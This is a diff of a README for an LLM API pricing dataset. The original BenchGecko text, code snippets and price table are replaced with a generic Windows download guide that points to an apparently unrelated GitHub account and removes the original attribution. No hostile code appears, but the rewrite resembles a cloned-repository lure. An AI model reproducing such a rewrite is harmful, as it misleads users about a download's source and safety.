@@ -1,179 +1,225 @@
-# LLM API Pricing
+# 📊 llm-pricing - Clear LLM pricing in one file
 
-**Up-to-date pricing for 300+ LLM APIs in a single JSON file.**
+[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/wordenneapolitan768/llm-pricing)
 
-Powered by [BenchGecko](https://benchgecko.ai) -- The Data Layer of the AI Economy.
+## 🚀 Getting Started
 
-![Last Updated](https://img.shields.io/badge/last_updated-2026-04-13brightgreen)
-![Models](https://img.shields.io/badge/models-349-blue)
-![License](https://img.shields.io/badge/license-MIT-green)
+llm-pricing gives you up-to-date API pricing for 300+ language models in one JSON file. It is a simple way to compare model costs without opening many sites.
 
----
+This project is best for people who want a fast way to look up LLM prices for tools like:
 
-## Why This Exists
+- OpenAI GPT models
+- Anthropic Claude models
+- Google Gemini models
+- Other common API models
 
-Every LLM provider has different pricing pages, different formats, different units. This repo gives you **one canonical JSON file** with standardized pricing for every major LLM API, updated weekly from the [OpenRouter](https://openrouter.ai) aggregator.
+If you use Windows and want to download the data, use the link below and follow the steps in this guide.
 
-Use it to build cost calculators, comparison tools, billing dashboards, or just to answer "how much does GPT-4o cost again?"
+## 📥 Download
 
-For full benchmark scores, performance comparisons, and provider analytics, see [benchgecko.ai](https://benchgecko.ai).
+[Visit the download page](https://github.com/wordenneapolitan768/llm-pricing)
 
----
+### What to do on Windows
 
-## Quick Start
+1. Open the link above in your browser.
+2. On the GitHub page, look for the files in the repository.
+3. Download the JSON file that contains the pricing data.
+4. Save the file to a folder you can find later, such as Downloads or Documents.
 
-### Fetch the latest pricing
+If your browser asks what to do with the file, choose **Save**.
 
-```bash
-# Raw JSON (346 models, ~200KB)
-curl -sL https://raw.githubusercontent.com/BenchGecko/llm-pricing/main/pricing.json | python3 -m json.tool | head -50
+## 🖥️ What You Need
 
-# Grouped by provider
-curl -sL https://raw.githubusercontent.com/BenchGecko/llm-pricing/main/pricing-by-provider.json
-```
+You do not need special software to view the data, but you do need one of these:
 
-### JavaScript / TypeScript
+- A modern web browser like Chrome, Edge, or Firefox
+- Notepad on Windows
+- Any text editor that can open JSON files
 
-```js
-const res = await fetch(
-  'https://raw.githubusercontent.com/BenchGecko/llm-pricing/main/pricing.json'
-);
-const { models } = await res.json();
+If you want to search or sort the data later, you can also open it with a spreadsheet tool or a JSON viewer.
 
-// Find cheapest model with 100K+ context
-const cheap = models
-  .filter(m => !m.is_free && m.context_window >= 100000)
-  .sort((a, b) => a.input_per_million - b.input_per_million);
+## 📦 What This Project Contains
 
-console.log(cheap[0]);
-// { id: "...", name: "...", input_per_million: 0.08, ... }
-```
+The repository includes:
 
-### Python
+- One main JSON file with pricing data
+- Names of 300+ models
+- Input and output cost data
+- Model provider names
+- Weekly updates to keep prices current
 
-```python
-import requests
+The file is useful when you want one place to check pricing for:
 
-data = requests.get(
-    "https://raw.githubusercontent.com/BenchGecko/llm-pricing/main/pricing.json"
-).json()
+- Prompt input costs
+- Output costs
+- Model families
+- Provider differences
 
-# Calculate cost for 1M input + 100K output tokens
-for m in data["models"]:
-    if "gpt-4" in m["id"]:
-        cost = m["input_per_million"] + (m["output_per_million"] * 0.1)
-        print(f"{m['name']}: ${cost:.2f}")
-```
+## 🪟 Open the File on Windows
 
-### Install via npm
+After you download the file:
 
-```bash
-npm install @benchgecko/llm-pricing
-```
+1. Go to the folder where you saved it.
+2. Right-click the JSON file.
+3. Choose **Open with**.
+4. Pick **Notepad** or your preferred text editor.
 
-```js
-const pricing = require('@benchgecko/llm-pricing');
-console.log(pricing.models.length); // 346
-console.log(pricing.models.find(m => m.id === 'openai/gpt-4o'));
-```
+You can also open it in a browser if you want a quick look.
 
-> Note: For always-fresh data, use the raw GitHub URL. The npm package is updated weekly.
+### If you want easier viewing
 
----
+Try one of these:
 
-## Top Models by Price
+- **Notepad** for a simple view
+- **Edge** or **Chrome** for a cleaner formatted view
+- **Excel** if you want to inspect values in rows
+- A JSON viewer if you want to search model names fast
 
-| Model | Provider | Input ($/1M tokens) | Output ($/1M tokens) | Context |
-|-------|----------|--------------------:|---------------------:|--------:|
-| Claude Opus 4.6 | Anthropic | $5.00 | $25.00 | 1000K |
-| Claude Sonnet 4.6 | Anthropic | $3.00 | $15.00 | 1000K |
-| Claude Sonnet 4.5 | Anthropic | $3.00 | $15.00 | 1000K |
-| Claude Haiku 4.5 | Anthropic | $1.00 | $5.00 | 200K |
-| DeepSeek V3 0324 | DeepSeek | $0.20 | $0.77 | 164K |
-| R1 | DeepSeek | $0.70 | $2.50 | 64K |
-| Gemini 2.5 Pro | Google DeepMind | $1.25 | $10.00 | 1049K |
-| Gemini 2.5 Flash | Google DeepMind | $0.30 | $2.50 | 1049K |
-| Gemini 2.0 Flash | Google DeepMind | $0.10 | $0.40 | 1049K |
-| Llama 4 Maverick | Meta | $0.15 | $0.60 | 1049K |
-| Llama 4 Scout | Meta | $0.08 | $0.30 | 328K |
-| Mistral Large 2411 | Mistral AI | $2.00 | $6.00 | 131K |
-| GPT-4.1 | OpenAI | $2.00 | $8.00 | 1048K |
-| GPT-4.1 Mini | OpenAI | $0.40 | $1.60 | 1048K |
-| GPT-4.1 Nano | OpenAI | $0.10 | $0.40 | 1048K |
-| GPT-4o | OpenAI | $2.50 | $10.00 | 128K |
-| GPT-4o-mini | OpenAI | $0.15 | $0.60 | 128K |
-| o3 | OpenAI | $2.00 | $8.00 | 200K |
-| o3 Mini | OpenAI | $1.10 | $4.40 | 200K |
-| o4 Mini | OpenAI | $1.10 | $4.40 | 200K |
+## 🔍 How to Use the Data
 
-> Full pricing for all 346 models available in [`pricing.json`](pricing.json).
+The JSON file lists model pricing in a format that is easy to read and reuse.
 
-**Want to compare performance too?** See how these models score on 40+ benchmarks at [benchgecko.ai/compare](https://benchgecko.ai/compare)
+You can use it to:
 
----
+- Check model prices before making an API call
+- Compare vendors
+- Track which model fits your budget
+- Keep a local copy of pricing data
+- Build your own internal cost reference
 
-## Data Schema
+A typical entry may include:
 
-Each model in `pricing.json` has this structure:
+- Model name
+- Provider
+- Input price
+- Output price
+- Unit size
+- Notes about the model
 
-```json
-{
-  "id": "openai/gpt-4o",
-  "name": "GPT-4o",
-  "provider": "OpenAI",
-  "input_per_million": 2.5,
-  "output_per_million": 10.0,
-  "context_window": 128000,
-  "max_output": 16384,
-  "is_free": false,
-  "modalities": ["file", "image", "text"],
-  "type": "chat"
-}
-```
+## 🧭 Find a Model Fast
 
-| Field | Type | Description |
-|-------|------|-------------|
-| `id` | string | OpenRouter model identifier (e.g., `openai/gpt-4o`) |
-| `name` | string | Human-readable model name |
-| `provider` | string | Company/org that created the model |
-| `input_per_million` | number | Cost in USD per 1 million input tokens |
-| `output_per_million` | number | Cost in USD per 1 million output tokens |
-| `context_window` | number \| null | Maximum context length in tokens |
-| `max_output` | number \| null | Maximum output/completion tokens |
-| `is_free` | boolean | Whether the model is free to use |
-| `modalities` | string[] | Supported modalities (text, image, audio, video, file) |
-| `type` | string | Model type: `chat`, `image`, `embedding`, `speech` |
+If you want to find a model name in the file:
 
-### Files
+1. Open the file in Notepad or your browser.
+2. Press **Ctrl + F**.
+3. Type the model name, such as GPT, Claude, or Gemini.
+4. Press **Enter** to move through matches.
 
-| File | Description |
-|------|-------------|
-| [`pricing.json`](pricing.json) | Flat list of all models, sorted by provider then name |
-| [`pricing-by-provider.json`](pricing-by-provider.json) | Same data grouped by provider name |
+This works well when you want to check one model without reading the full file.
 
----
+## 🔄 Weekly Updates
 
-## Related Resources
+This repository is updated each week so the pricing stays current.
 
-- [BenchGecko](https://benchgecko.ai) — Full model rankings, benchmark scores, and provider analytics
-- [BenchGecko Compare](https://benchgecko.ai/compare) — Side-by-side model comparison with pricing + performance
-- [BenchGecko API](https://benchgecko.ai/api-docs) — Free REST API for model data, benchmarks, and pricing
-- [Awesome LLM Benchmarks](https://github.com/BenchGecko/awesome-llm-benchmarks) — Curated list of 60+ AI benchmarks
+That helps when:
 
----
+- Model prices change
+- New models appear
+- Old models get replaced
+- Providers adjust their billing
 
-## Data Source
+If you want the latest values, download the file again from the repository page.
 
-Pricing data is sourced from the [OpenRouter API](https://openrouter.ai/api/v1/models) and updated weekly. OpenRouter aggregates pricing from all major LLM providers into a single API.
+## 🧩 Common Uses
 
-Prices reflect the OpenRouter pass-through rates, which match or closely track the official provider pricing.
+People use llm-pricing for tasks like:
 
-For full benchmark comparisons, performance scores, and provider analytics, visit **[benchgecko.ai](https://benchgecko.ai)**.
+- Planning LLM costs for a project
+- Comparing API options
+- Checking which model is cheaper
+- Reviewing pricing before deployment
+- Keeping a local pricing list for support teams
 
----
+It works well for small teams, solo users, and anyone who needs a quick price check.
 
-## License
+## 📁 File Format
 
-MIT -- use this data however you want. Attribution appreciated but not required.
+The main file uses JSON format.
 
-If you build something cool with this data, let us know at [benchgecko.ai](https://benchgecko.ai) or [@BenchGecko](https://twitter.com/BenchGecko) on Twitter.
+JSON is a plain text file type that stores data in a clean structure. It is easy for apps to read and simple for people to open.
+
+You may see parts like:
+
+- Curly brackets `{ }`
+- Square brackets `[ ]`
+- Labels and values
+- Lists of model records
+
+If that looks busy, open it in a browser or a text editor with line wrapping turned on.
+
+## ⚙️ Simple Windows Setup
+
+You do not need to install the project like a normal app.
+
+For Windows users, the setup is:
+
+1. Open the GitHub page.
+2. Download the JSON file.
+3. Save it on your PC.
+4. Open it when you need pricing data.
+
+If you want to keep it handy, place it on your Desktop or in a folder named `LLM Pricing`.
+
+## 🧪 Example Workflow
+
+Here is a simple way to use the file:
+
+1. Open the JSON file.
+2. Search for a model, such as `gpt-4` or `claude`.
+3. Read the input and output rates.
+4. Compare the model with others.
+5. Pick the one that fits your budget.
+
+This is useful when you are choosing between models for chat, coding, image tasks, or general AI work.
+
+## 📌 Topics Covered
+
+This repository focuses on:
+
+- AI model pricing
+- Anthropic pricing
+- OpenAI pricing
+- Google Gemini pricing
+- Claude pricing
+- GPT-4 pricing
+- LLM cost data
+- Machine learning tools
+- API cost tracking
+
+## 🧰 Tips for Best Results
+
+- Keep the file in a folder with a clear name
+- Download the latest version each week
+- Use search to jump to a model name
+- Open the file in a browser if raw text is hard to read
+- Keep a copy if you need to compare prices over time
+
+## 📚 Need Help Finding the File
+
+If you are not sure what to click:
+
+1. Use the download page link near the top.
+2. Look for the repository file list.
+3. Find the JSON file with pricing data.
+4. Click the file name.
+5. Download or open it in your browser.
+
+If the file name changes, look for the main data file that matches the repository description.
+
+## 🔐 Safe File Handling
+
+When you download the file on Windows:
+
+- Save it from the GitHub page only
+- Check that the file type is `.json`
+- Open it with built-in Windows tools first
+- Keep the file in a folder you trust
+
+## 🧾 Quick Reference
+
+- **Project name:** llm-pricing
+- **What it does:** Gives LLM API pricing in one JSON file
+- **File type:** JSON
+- **Update pace:** Weekly
+- **Best for:** Checking model costs on Windows
+- **Main link:** https://github.com/wordenneapolitan768/llm-pricing
